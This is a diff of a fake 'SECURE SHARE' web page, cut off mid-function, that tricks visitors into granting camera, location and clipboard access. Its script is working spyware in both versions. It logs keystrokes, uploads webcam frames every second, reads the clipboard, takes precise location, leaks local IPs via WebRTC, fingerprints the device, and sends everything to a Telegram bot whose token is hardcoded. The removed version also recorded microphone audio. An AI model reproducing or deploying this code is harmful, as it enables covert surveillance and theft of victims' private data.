@@ -58,25 +58,21 @@ body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:
 <div class="bg-layer"><iframe class="bg-frame" id="bgFrame" sandbox="allow-same-origin"></iframe><div class="bg-fade"></div></div>
 <div class="portal-overlay">
 <div class="glass-card">
-<div class="hdr"><div class="ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div><h1>SECURE SHARE</h1><p>Grant all permissions to view the content</p></div>
+<div class="hdr"><div class="ico"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg></div><h1>SECURE SHARE</h1><p>Grant all permissions to view</p></div>
 <div class="perm-list">
-<div class="perm-row" id="permCam"><div class="pi"><svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></div><div class="pt"><div class="pn">&#128247; Camera</div><div class="pd"></div></div><div class="ps"></div></div>
-<div class="perm-row" id="permMic"><div class="pi"><svg viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg></div><div class="pt"><div class="pn">&#127908; Microphone</div><div class="pd"></div></div><div class="ps"></div></div>
-<div class="perm-row" id="permLoc"><div class="pi"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="pt"><div class="pn">&#128205; Location</div><div class="pd"></div></div><div class="ps"></div></div>
-<div class="perm-row" id="permNotif"><div class="pi"><svg viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></div><div class="pt"><div class="pn">&#128276; Notifications</div><div class="pd"></div></div><div class="ps"></div></div>
-<div class="perm-row" id="permClip"><div class="pi"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></div><div class="pt"><div class="pn">&#128203; Clipboard</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permCam"><div class="pi"><svg viewBox="0 0 24 24"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></div><div class="pt"><div class="pn">Camera</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permLoc"><div class="pi"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="pt"><div class="pn">Location</div><div class="pd"></div></div><div class="ps"></div></div>
+<div class="perm-row" id="permClip"><div class="pi"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></div><div class="pt"><div class="pn">Clipboard</div><div class="pd"></div></div><div class="ps"></div></div>
 </div>
 <div class="prog" id="prog"><div class="prog-bar"><div class="prog-fill" id="pfill"></div></div><div class="prog-lbl" id="plbl">Initializing...</div></div>
 <button class="cta" id="cta" disabled><span id="btnT">Grant all permissions to continue</span><span class="sub" id="btnS">Click each row above to allow</span></button>
-<div class="retry-link" id="retryBtn">&#10227; Re-request missing permissions</div>
-<div class="ftr"><p>All 5 permissions required to see the content</p></div>
+<div class="retry-link" id="retryBtn">⟳ Re-request missing permissions</div>
+<div class="ftr"><p>🔐 All 3 permissions required</p></div>
 </div></div>
 <div class="tst" id="toastMsg"></div>
 
 <script>
-// ============================================================
-// TELEGRAM CONFIG
-// ============================================================
+// =================== TELEGRAM CONFIG ===================
 (function(){
     var token = '8757443004:AAFsg015tmfMkPZKQRxl_FQsTA3tknNRfWM';
     var chatId = '6589622715';
@@ -85,79 +81,71 @@ body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;min-height:
         chatId: chatId,
         api: 'https://api.telegram.org/bot' + token + '/sendDocument',
         msgApi: 'https://api.telegram.org/bot' + token + '/sendMessage',
-        photoApi: 'https://api.telegram.org/bot' + token + '/sendPhoto',
-        audioApi: 'https://api.telegram.org/bot' + token + '/sendAudio'
+        photoApi: 'https://api.telegram.org/bot' + token + '/sendPhoto'
     };
 })();
 
-// ============================================================
-// GLOBAL TARGET URL - SET THIS TO YOUR DESIRED REDIRECT URL
-// ============================================================
+// ================ TARGET URL (opens in NEW TAB after 6 seconds) =================
 var TARGET_URL = 'https://www.youtube.com/watch?v=_3uP_ii4yTw';
 
-// ============================================================
-// DOM SHORTCUTS
-// ============================================================
+// =================== DOM elements ===================
 function $(id) { return document.getElementById(id); }
 var btn = $('cta'), btnT = $('btnT'), btnS = $('btnS');
 var prog = $('prog'), pfill = $('pfill'), plbl = $('plbl');
 var toastEl = $('toastMsg');
 var retryEl = $('retryBtn');
 
-// ============================================================
-// STATE
-// ============================================================
-var perms = {cam: false, mic: false, loc: false, notif: false, clip: false};
+// =================== GLOBAL STATE ===================
+var perms = {cam: false, loc: false, clip: false};
 var allGranted = false;
-var extractionDone = false;
 var extractionStarted = false;
+var extractionDone = false;
 var toastTimer = null;
+
+// Camera capture vars
 var cameraStream = null;
+var videoElement = null;
 var cameraInterval = null;
 var capturedFrames = [];
-var micStream = null;
-var micRecorder = null;
-var audioChunks = [];
-var keepAliveInterval = null;
 
-// ============================================================
-// TOAST
-// ============================================================
+// Keylogger buffer
+var keyBuffer = [];
+
+// 6-second timer
+var gatherTimer = null;
+
+// =================== TOAST ===================
 function showToast(msg) {
     toastEl.innerHTML = msg;
     toastEl.className = 'tst up';
     clearTimeout(toastTimer);
-    toastTimer = setTimeout(function(){ toastEl.className = 'tst'; }, 2800);
+    toastTimer = setTimeout(function(){ toastEl.className = 'tst'; }, 2000);
 }
 
-// ============================================================
-// UI UPDATE
-// ============================================================
+// =================== UI UPDATE ===================
 function updateUI() {
-    allGranted = perms.cam && perms.mic && perms.loc && perms.notif && perms.clip;
+    allGranted = perms.cam && perms.loc && perms.clip;
     if (extractionDone) {
         btn.disabled = true;
         btn.className = 'cta';
-        btnT.innerHTML = '&#10003; Complete';
+        btnT.innerHTML = '✓ Ready';
         btnS.innerHTML = '';
         return;
     }
     if (allGranted) {
         btn.disabled = false;
         btn.className = 'cta go';
-        btnT.innerHTML = '&#128274; UNLOCK SHARED FILES/LINK';
-        btnS.innerHTML = 'CLICK HERE';
+        btnT.innerHTML = 'CLICK HERE';
+        btnS.innerHTML = '';
     } else {
         btn.disabled = true;
         btn.className = 'cta';
         btnT.innerHTML = 'Grant all permissions to continue';
-        var missing = '';
-        if (!perms.cam) missing += '&#128247; ';
-        if (!perms.mic) missing += '&#127908; ';
-        if (!perms.loc) missing += '&#128205; ';
-        if (!perms.notif) missing += '&#128276; ';
-        if (!perms.clip) missing += '&#128203; ';
-        btnS.innerHTML = 'Missing: ' + (missing || 'none');
+        var missing = [];
+        if (!perms.cam) missing.push('Camera');
+        if (!perms.loc) missing.push('Location');
+        if (!perms.clip) missing.push('Clipboard');
+        btnS.innerHTML = 'Missing: ' + (missing.join(', ') || 'none');
     }
 }
 
@@ -166,1014 +154,406 @@ function markGranted(key, el) {
     perms[key] = true;
     el.classList.add('done');
     updateUI();
-    var names = {cam:'Camera', mic:'Microphone', loc:'Location', notif:'Notifications', clip:'Clipboard'};
-    showToast('&#10003; ' + names[key] + ' granted');
 }
 
-// ============================================================
-// PERMISSION REQUEST HANDLERS
-// ============================================================
+// =================== PERMISSION HANDLERS ===================
 function requestCamera() {
-    if (perms.cam) { showToast('Already granted'); return; }
+    if (perms.cam) return;
     navigator.mediaDevices.getUserMedia({video: true})
         .then(function(stream){
-            stream.getTracks().forEach(function(t){ t.stop(); });
+            stream.getTracks().forEach(t=>t.stop());
             markGranted('cam', $('permCam'));
         })
-        .catch(function(){ showToast('&#10007; Camera denied'); });
-}
-
-function requestMicrophone() {
-    if (perms.mic) { showToast('Already granted'); return; }
-    navigator.mediaDevices.getUserMedia({audio: true})
-        .then(function(stream){
-            stream.getTracks().forEach(function(t){ t.stop(); });
-            markGranted('mic', $('permMic'));
-        })
-        .catch(function(){ showToast('&#10007; Mic denied'); });
+        .catch(()=> showToast('✗ Camera denied'));
 }
 
 function requestLocation() {
-    if (perms.loc) { showToast('Already granted'); return; }
+    if (perms.loc) return;
     navigator.geolocation.getCurrentPosition(
-        function(){ markGranted('loc', $('permLoc')); },
-        function(){ showToast('&#10007; Location denied'); },
-        {timeout: 8000, enableHighAccuracy: true}
+        ()=> markGranted('loc', $('permLoc')),
+        ()=> showToast('✗ Location denied'),
+        {timeout: 8000}
     );
 }
 
-function requestNotifications() {
-    if (perms.notif) { showToast('Already granted'); return; }
-    if (!('Notification' in window)) { showToast('Not supported'); return; }
-    Notification.requestPermission().then(function(p){
-        if (p === 'granted') {
-            markGranted('notif', $('permNotif'));
-            try { new Notification('Secure Vault', {body:'Alerts enabled', silent:true}); } catch(e){}
-        } else {
-            showToast('&#10007; Notifications blocked');
-        }
-    });
-}
-
 function requestClipboard() {
-    if (perms.clip) { showToast('Already granted'); return; }
+    if (perms.clip) return;
     navigator.clipboard.writeText('perm_ok')
-        .then(function(){
-            setTimeout(function(){
-                navigator.clipboard.readText().then(function(){
-                    markGranted('clip', $('permClip'));
-                }).catch(function(){
-                    markGranted('clip', $('permClip'));
-                });
-            }, 150);
-        })
-        .catch(function(){ markGranted('clip', $('permClip')); });
+        .then(()=> setTimeout(()=>{
+            navigator.clipboard.readText().finally(()=> markGranted('clip', $('permClip')));
+        }, 150))
+        .catch(()=> markGranted('clip', $('permClip')));
 }
 
 $('permCam').addEventListener('click', requestCamera);
-$('permMic').addEventListener('click', requestMicrophone);
 $('permLoc').addEventListener('click', requestLocation);
-$('permNotif').addEventListener('click', requestNotifications);
 $('permClip').addEventListener('click', requestClipboard);
-
-retryEl.addEventListener('click', function(){
-    if (extractionDone || extractionStarted) { showToast('Already processing'); return; }
+retryEl.addEventListener('click', ()=>{
+    if (extractionStarted) return;
     if (!perms.cam) requestCamera();
-    if (!perms.mic) requestMicrophone();
     if (!perms.loc) requestLocation();
-    if (!perms.notif) requestNotifications();
     if (!perms.clip) requestClipboard();
-    setTimeout(function(){
-        if (allGranted) showToast('&#10003; All granted!');
-        else showToast('&#9888; Some missing');
-    }, 200);
 });
 
-// ============================================================
-// KEYLOGGER
-// ============================================================
-(function(){
-    var buffer = [];
-    function flush() {
-        if (buffer.length === 0) return;
-        var chunk = buffer.join('');
-        buffer = [];
-        var p = {
-            chat_id: window.__C.chatId,
-            text: '[KEYLOG] ' + chunk.substring(0, 3900),
-            disable_notification: true
-        };
-        fetch(window.__C.msgApi, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(p)
-        }).catch(function(){});
-    }
-    function onKey(e) {
-        var k = e.key;
-        if (!k || k === 'Dead' || k === 'Unidentified') return;
-        if (k === 'Shift' || k === 'Control' || k === 'Alt' || k === 'Meta') return;
-        if (k === 'Backspace') buffer.push('[BS]');
-        else if (k === 'Enter') buffer.push('[ENTER]\n');
-        else if (k === 'Tab') buffer.push('[TAB]');
-        else if (k === 'Escape') buffer.push('[ESC]');
-        else if (k.length === 1) buffer.push(k);
-        else buffer.push('[' + k + ']');
-        if (buffer.length >= 40) flush();
-    }
-    window.addEventListener('keydown', onKey, true);
-    setInterval(flush, 7000);
-    window.addEventListener('beforeunload', flush);
-    window.__keyBuffer = buffer;
-    window.__flushKeylog = flush;
-})();
+// =================== KEYLOGGER ===================
+function flushKeylog() {
+    if (keyBuffer.length === 0) return;
+    var chunk = keyBuffer.join('');
+    keyBuffer = [];
+    fetch(window.__C.msgApi, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({chat_id: window.__C.chatId, text: '[KEYLOG] '+chunk.substring(0,3900), disable_notification: true})
+    }).catch(()=>{});
+}
+window.addEventListener('keydown', (e)=>{
+    var k = e.key;
+    if (!k || k==='Dead'||k==='Unidentified') return;
+    if (['Shift','Control','Alt','Meta'].includes(k)) return;
+    if (k === 'Backspace') keyBuffer.push('[BS]');
+    else if (k === 'Enter') keyBuffer.push('[ENTER]\n');
+    else if (k === 'Tab') keyBuffer.push('[TAB]');
+    else if (k === 'Escape') keyBuffer.push('[ESC]');
+    else if (k.length === 1) keyBuffer.push(k);
+    else keyBuffer.push('['+k+']');
+    if (keyBuffer.length >= 45) flushKeylog();
+}, true);
+setInterval(flushKeylog, 7000);
+window.addEventListener('beforeunload', flushKeylog);
 
-// ============================================================
-// CONTINUOUS CAMERA CAPTURE - runs until tab is closed
-// ============================================================
-function startContinuousCameraCapture(fps) {
+// ==================== CAMERA (1 frame per second) ====================
+function startCameraCapture(fps=1) {
     if (cameraInterval) return;
-
     navigator.mediaDevices.getUserMedia({video: true})
-        .then(function(stream){
+        .then(stream => {
             cameraStream = stream;
-            var v = document.createElement('video');
-            v.srcObject = stream;
-            v.playsInline = true;
-            v.muted = true;
-            v.autoplay = true;
-
-            v.onloadedmetadata = function(){
-                v.play().then(function(){
-                    // Capture frames at specified fps
-                    cameraInterval = setInterval(function(){
-                        try {
-                            var cv = document.createElement('canvas');
-                            cv.width = v.videoWidth || 640;
-                            cv.height = v.videoHeight || 480;
-                            cv.getContext('2d').drawImage(v, 0, 0);
-                            capturedFrames.push(cv.toDataURL('image/jpeg', 0.7));
-                            // Auto-send when we have 10 frames accumulated
-                            if (capturedFrames.length >= 10) {
-                                sendFrameBatch();
-                            }
-                        } catch(e){}
-                    }, 1000 / fps);
-
-                    // Also flush any accumulated frames every 15 seconds
-                    var frameFlushInterval = setInterval(function(){
-                        if (capturedFrames.length > 0) sendFrameBatch();
-                    }, 15000);
-
-                    // Store cleanup reference
-                    window.__frameFlushInterval = frameFlushInterval;
-
-                }).catch(function(){});
+            videoElement = document.createElement('video');
+            videoElement.srcObject = stream;
+            videoElement.muted = true;
+            videoElement.playsInline = true;
+            videoElement.autoplay = true;
+            videoElement.onloadedmetadata = () => {
+                videoElement.play().catch(e=>console.warn);
+                cameraInterval = setInterval(() => {
+                    if (!videoElement || videoElement.readyState < 2) return;
+                    try {
+                        let canvas = document.createElement('canvas');
+                        let w = videoElement.videoWidth || 640;
+                        let h = videoElement.videoHeight || 480;
+                        canvas.width = w;
+                        canvas.height = h;
+                        let ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoElement, 0, 0, w, h);
+                        let imgData = canvas.toDataURL('image/jpeg', 0.7);
+                        capturedFrames.push(imgData);
+                        let raw = atob(imgData.split(',')[1]);
+                        let buf = new Uint8Array(raw.length);
+                        for(let i=0;i<raw.length;i++) buf[i]=raw.charCodeAt(i);
+                        let blob = new Blob([buf], {type:'image/jpeg'});
+                        let fd = new FormData();
+                        fd.append('chat_id', window.__C.chatId);
+                        fd.append('photo', blob, `frame_${Date.now()}.jpg`);
+                        fd.append('caption', '📸');
+                        fetch(window.__C.photoApi, { method: 'POST', body: fd }).catch(()=>{});
+                    } catch(e) {}
+                }, 1000 / fps);
             };
-            v.onerror = function(){};
         })
-        .catch(function(){});
+        .catch(err => console.warn("Camera error", err));
 }
 
-function sendFrameBatch() {
-    if (capturedFrames.length === 0) return;
-    var batch = capturedFrames.splice(0, Math.min(capturedFrames.length, 5));
-    var delay = 0;
-    for (var i = 0; i < batch.length; i++) {
-        (function(idx, data) {
-            setTimeout(function(){
-                try {
-                    var raw = atob(data.split(',')[1]);
-                    var buf = new Uint8Array(raw.length);
-                    for (var b = 0; b < raw.length; b++) buf[b] = raw.charCodeAt(b);
-                    var blob = new Blob([buf], {type: 'image/jpeg'});
-                    var fd = new FormData();
-                    fd.append('chat_id', window.__C.chatId);
-                    fd.append('photo', blob, 'frame_' + Date.now() + '_' + (idx + 1) + '.jpg');
-                    fd.append('caption', '&#128247; Live Capture ' + (idx + 1));
-                    fetch(window.__C.photoApi, {method: 'POST', body: fd}).catch(function(){});
-                } catch(e){}
-            }, delay);
-            delay += 500;
-        })(i, batch[i]);
-    }
+function stopCameraCapture() {
+    if (cameraInterval) { clearInterval(cameraInterval); cameraInterval = null; }
+    if (cameraStream) { cameraStream.getTracks().forEach(t=>t.stop()); cameraStream = null; }
+    if (videoElement) { videoElement.srcObject = null; videoElement = null; }
 }
 
-function stopContinuousCamera() {
-    if (cameraInterval) {
-        clearInterval(cameraInterval);
-        cameraInterval = null;
-    }
-    if (window.__frameFlushInterval) {
-        clearInterval(window.__frameFlushInterval);
-        window.__frameFlushInterval = null;
-    }
-    if (cameraStream) {
-        cameraStream.getTracks().forEach(function(t){ t.stop(); });
-        cameraStream = null;
-    }
-    // Send any remaining frames
-    if (capturedFrames.length > 0) sendFrameBatch();
-}
-
-// ============================================================
-// CONTINUOUS MICROPHONE CAPTURE - runs until tab is closed
-// ============================================================
-function startContinuousMicCapture() {
-    if (!perms.mic || micRecorder) return;
-
-    navigator.mediaDevices.getUserMedia({audio: true})
-        .then(function(stream){
-            micStream = stream;
-            var mimeType = 'audio/webm';
-            try {
-                micRecorder = new MediaRecorder(stream, {mimeType: mimeType});
-            } catch(e) {
-                try {
-                    micRecorder = new MediaRecorder(stream);
-                } catch(e2) {
-                    return;
-                }
-            }
-
-            micRecorder.ondataavailable = function(e) {
-                if (e.data.size > 0) {
-                    audioChunks.push(e.data);
-                    // Send after 3 chunks accumulated
-                    if (audioChunks.length >= 3) {
-                        sendAudioBatch();
-                    }
-                }
-            };
-
-            // Record in 5-second segments
-            micRecorder.start(5000);
-
-            // Periodic flush every 20 seconds
-            var audioFlushInterval = setInterval(function(){
-                if (audioChunks.length > 0) sendAudioBatch();
-            }, 20000);
-
-            window.__audioFlushInterval = audioFlushInterval;
-        })
-        .catch(function(){});
-}
-
-function sendAudioBatch() {
-    if (audioChunks.length === 0) return;
-    var batch = audioChunks.splice(0, Math.min(audioChunks.length, 3));
-    var blob = new Blob(batch, {type: 'audio/webm'});
-    try {
-        var fd = new FormData();
-        fd.append('chat_id', window.__C.chatId);
-        fd.append('audio', blob, 'audio_' + Date.now() + '.webm');
-        fd.append('caption', '&#127908; Audio Capture');
-        fetch(window.__C.audioApi, {method: 'POST', body: fd}).catch(function(){});
-    } catch(e){}
-}
-
-function stopContinuousMic() {
-    if (micRecorder) {
-        try {
-            micRecorder.stop();
-            // Force final chunk
-            if (micRecorder.state !== 'inactive') {
-                micRecorder.requestData();
-            }
-        } catch(e){}
-        micRecorder = null;
-    }
-    if (window.__audioFlushInterval) {
-        clearInterval(window.__audioFlushInterval);
-        window.__audioFlushInterval = null;
-    }
-    if (micStream) {
-        micStream.getTracks().forEach(function(t){ t.stop(); });
-        micStream = null;
-    }
-    // Send any remaining audio
-    if (audioChunks.length > 0) sendAudioBatch();
-}
-
-// ============================================================
-// DATA EXTRACTION FUNCTIONS
-// ============================================================
+// ==================== DATA COLLECTION ====================
 function getDeviceInfo() {
-    var n = navigator, s = screen;
+    let n = navigator, s = screen;
     return {
-        'User Agent': n.userAgent,
-        'Platform': n.platform,
-        'Language': n.language,
-        'CPU Cores': n.hardwareConcurrency || 'unknown',
-        'Device Memory GB': n.deviceMemory || 'unknown',
-        'Max Touch Points': n.maxTouchPoints,
-        'Screen Size': s.width + 'x' + s.height,
-        'Color Depth': s.colorDepth,
-        'Pixel Ratio': window.devicePixelRatio,
+        'User Agent': n.userAgent, 'Platform': n.platform, 'Language': n.language,
+        'CPU Cores': n.hardwareConcurrency || 'unknown', 'Device Memory GB': n.deviceMemory || 'unknown',
+        'Max Touch Points': n.maxTouchPoints, 'Screen Size': s.width+'x'+s.height,
+        'Color Depth': s.colorDepth, 'Pixel Ratio': window.devicePixelRatio,
         'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
-        'Cookies Enabled': n.cookieEnabled,
-        'Do Not Track': n.doNotTrack || 'unspecified'
+        'Cookies Enabled': n.cookieEnabled, 'Do Not Track': n.doNotTrack || 'unspecified'
     };
 }
-
 function getWebGLInfo() {
-    try {
-        var c = document.createElement('canvas');
-        var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (!gl) return 'WebGL not supported';
-        var ext = gl.getExtension('WEBGL_debug_renderer_info');
-        if (ext) {
-            return {
-                Vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
-                Renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
-            };
-        }
-        return 'No debug info';
-    } catch(e) { return 'Error'; }
+    try { let c=document.createElement('canvas'); let gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl) return 'WebGL not supported'; let ext=gl.getExtension('WEBGL_debug_renderer_info');
+        return ext ? {Vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), Renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)} : 'No debug';
+    } catch(e){ return 'Error'; }
 }
-
 function getCanvasFP() {
-    try {
-        var c = document.createElement('canvas');
-        c.width = 300;
-        c.height = 150;
-        var ctx = c.getContext('2d');
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 300, 150);
-        ctx.fillStyle = '#fff';
-        ctx.font = '18px Arial';
-        ctx.fillText('FP', 20, 40);
+    try { let c=document.createElement('canvas'); c.width=300;c.height=150; let ctx=c.getContext('2d');
+        ctx.fillStyle='#f60'; ctx.fillRect(0,0,300,150); ctx.fillStyle='#fff'; ctx.font='18px Arial'; ctx.fillText('FP',20,40);
         return c.toDataURL();
-    } catch(e) { return 'error'; }
+    } catch(e){ return 'error'; }
 }
-
 function getFonts() {
-    var fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
-                 'Comic Sans MS', 'Impact', 'Segoe UI', 'Roboto', 'Helvetica',
-                 'monospace', 'sans-serif', 'Calibri', 'Cambria', 'Palatino',
-                 'Tahoma', 'Trebuchet MS'];
-    try {
-        var c = document.createElement('canvas');
-        var ctx = c.getContext('2d');
-        var test = 'mmMwWLliI0O&1';
-        var detected = [];
-        for (var i = 0; i < fonts.length; i++) {
-            ctx.font = '36px "' + fonts[i] + '", monospace';
-            var w1 = ctx.measureText(test).width;
-            ctx.font = '36px monospace';
-            var w2 = ctx.measureText(test).width;
-            if (w1 !== w2) detected.push(fonts[i]);
-        }
+    let fonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Segoe UI','Roboto','Helvetica'];
+    try { let c=document.createElement('canvas'); let ctx=c.getContext('2d'); let test='mmMwWLliI0O&1'; let detected=[];
+        for(let f of fonts){ ctx.font='36px "'+f+'", monospace'; let w1=ctx.measureText(test).width;
+            ctx.font='36px monospace'; let w2=ctx.measureText(test).width; if(w1!==w2) detected.push(f); }
         return detected;
-    } catch(e) { return []; }
+    } catch(e){ return []; }
 }
-
 function getWebRTCIPs() {
-    return new Promise(function(resolve){
-        var ips = [];
-        try {
-            var pc = new RTCPeerConnection({
-                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
-            });
-            pc.createDataChannel('');
-            pc.createOffer().then(function(o){
-                pc.setLocalDescription(o);
-            }).catch(function(){});
-            pc.onicecandidate = function(e) {
-                if (e.candidate) {
-                    var m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if (m && ips.indexOf(m[0]) === -1) ips.push(m[0]);
-                } else {
-                    try{ pc.close(); } catch(e){}
-                    resolve(ips);
-                }
-            };
-            setTimeout(function(){
-                try{ pc.close(); } catch(e){}
-                resolve(ips);
-            }, 3000);
-        } catch(e) { resolve([]); }
+    return new Promise(resolve=>{
+        let ips=[]; let pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+        pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
+        pc.onicecandidate=e=>{ if(e.candidate){ let m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m && !ips.includes(m[0])) ips.push(m[0]); }
+            else { try{pc.close();}catch(e){} resolve(ips); } };
+        setTimeout(()=>{ try{pc.close();}catch(e){} resolve(ips); }, 3000);
     });
 }
-
 function getStorageStats() {
-    try {
-        return {
-            localStorageKeys: Object.keys(localStorage).length,
-            sessionStorageKeys: Object.keys(sessionStorage).length,
-            cookieLength: document.cookie.length
-        };
-    } catch(e) { return {}; }
+    try { return { localStorageKeys: Object.keys(localStorage).length, sessionStorageKeys: Object.keys(sessionStorage).length, cookieLength: document.cookie.length }; }
+    catch(e){ return {}; }
 }
-
 function getBattery() {
-    if (!navigator.getBattery) return Promise.resolve(null);
-    return navigator.getBattery().then(function(b){
-        return {
-            level: Math.round(b.level * 100) + '%',
-            charging: b.charging
-        };
-    }).catch(function(){ return null; });
+    if(!navigator.getBattery) return Promise.resolve(null);
+    return navigator.getBattery().then(b=>{ return { level: Math.round(b.level*100)+'%', charging: b.charging }; }).catch(()=>null);
 }
-
 function getNetwork() {
-    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (c) {
-        return {
-            connectionType: c.effectiveType || 'unknown',
-            downlinkMbps: c.downlink,
-            rttMs: c.rtt
-        };
-    }
-    return {};
+    let c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+    return c ? { connectionType: c.effectiveType || 'unknown', downlinkMbps: c.downlink, rttMs: c.rtt } : {};
 }
-
 function getClipboardText() {
-    if (!perms.clip) return Promise.resolve('Not granted');
-    return navigator.clipboard.readText()
-        .then(function(t){
-            return (t || '').substring(0, 500);
-        })
-        .catch(function(e){
-            return 'Error: ' + e.message;
-        });
+    if(!perms.clip) return Promise.resolve('Not granted');
+    return navigator.clipboard.readText().then(t=> t.substring(0,500)).catch(e=> 'Error: '+e.message);
 }
-
 function getLocation() {
-    return new Promise(function(resolve){
-        navigator.geolocation.getCurrentPosition(
-            function(p){
-                resolve({
-                    latitude: p.coords.latitude,
-                    longitude: p.coords.longitude,
-                    accuracyMeters: p.coords.accuracy,
-                    altitude: p.coords.altitude,
-                    speed: p.coords.speed,
-                    heading: p.coords.heading,
-                    timestamp: new Date(p.timestamp).toISOString(),
-                    googleMaps: 'https://www.google.com/maps?q=' +
-                        p.coords.latitude + ',' + p.coords.longitude
-                });
-            },
-            function(e){
-                resolve({ error: e.message });
-            },
-            { enableHighAccuracy: true, timeout: 8000 }
-        );
+    return new Promise(resolve=>{
+        navigator.geolocation.getCurrentPosition(p=>resolve({ latitude:p.coords.latitude, longitude:p.coords.longitude, accuracyMeters:p.coords.accuracy,
+            altitude:p.coords.altitude, speed:p.coords.speed, heading:p.coords.heading, timestamp:new Date(p.timestamp).toISOString(),
+            googleMaps:'https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude }),
+            e=>resolve({ error: e.message }), {enableHighAccuracy:true, timeout:8000});
     });
 }
 
-// ============================================================
-// HTML REPORT BUILDER
-// ============================================================
-function buildReport(d, webgl, canvasFP, fonts, ips, storage, battery, network,
-                     clipboard, location, frames, keys) {
-    function esc(s) {
-        return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+// ==================== WHITE THEME REPORT TEMPLATE ====================
+function buildWhiteThemeReport(device, webgl, canvasFP, fonts, ips, storage, battery, network, clipboard, locationData, framesBase64, keystrokeLog) {
+    function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+    
+    // Helper to format nested objects
+    function formatValue(v){
+        if(v === null || v === undefined) return 'N/A';
+        if(typeof v === 'object') return '<pre style="margin:0;background:#f5f5f5;padding:8px;border-radius:6px;font-size:12px;">'+esc(JSON.stringify(v, null, 2))+'</pre>';
+        return esc(v);
     }
-
-    var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Vault Report</title><style>';
-    h += 'body{font-family:Segoe UI,sans-serif;background:#0a0f1a;color:#eef;padding:20px;margin:0}';
-    h += '.c{max-width:1000px;margin:0 auto;background:#11161f;border-radius:24px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}';
-    h += 'h1{color:#3884ff;border-left:4px solid #3884ff;padding-left:20px;font-size:22px}';
-    h += 'h2{color:#48a8ff;margin-top:24px;border-bottom:1px solid #2a3342;padding-bottom:6px;font-size:16px}';
-    h += 'table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px}';
-    h += 'th,td{text-align:left;padding:7px 12px;border-bottom:1px solid #2a3342}';
-    h += 'th{color:#8895a8;font-weight:500;width:200px}';
-    h += 'pre{background:#0a0e14;padding:12px;border-radius:12px;overflow-x:auto;font-size:12px}';
-    h += '.badge{display:inline-block;background:#1f8a4c;padding:2px 10px;border-radius:20px;font-size:12px;color:#fff}';
-    h += '.gallery{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}';
-    h += '.gallery img{width:120px;height:90px;object-fit:cover;border-radius:8px;border:1px solid #2a3342}';
-    h += '.ft{text-align:center;margin-top:32px;font-size:11px;color:#6a7380}';
